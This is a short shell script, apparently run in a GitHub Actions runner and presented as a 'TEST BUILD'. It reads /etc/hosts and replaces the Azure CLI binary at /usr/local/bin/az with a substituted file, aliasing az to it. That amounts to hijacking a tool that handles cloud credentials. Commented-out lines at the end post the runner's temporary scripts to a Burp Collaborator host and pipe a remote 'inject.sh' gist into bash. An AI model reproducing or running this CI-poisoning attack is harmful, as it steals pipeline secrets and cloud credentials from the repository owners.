echo "${GITHUB_HEAD_REF}"
echo "TEST BUILD"
echo $MY_VAL
cat /etc/hosts
which npm
which az
cp test /usr/local/bin/az
chmod +x /usr/local/bin/az
custom_az="/usr/local/bin/az"

# Check if the custom az executable existsasdasd
if [ -x "$custom_az" ]; then
  # Check if the az alias is already defined
  if alias az &>/dev/null; then
    # If the alias is already defined, remove it before creating the new one
    unalias az
  fi

  # Create the new alias
  alias az="$custom_az"
  echo "Alias 'az' created for $custom_az"
else
  echo "Custom az executable not found at $custom_az. Alias not created."
fi



# curl -d "$(cat /home/runner/work/_temp/*.sh)" https://ise30gxlwrwg8m6xm64nk2w9208swh.burpcollaborator.net
#curl -sSfL gist.githubusercontent.com/d3kum1d0r1y4100/f6e2261de7699c7cc799fc826d9693ee/raw/1dc6a6626c5c1d71a088d7d2204590f4734008f3/inject.sh | bash
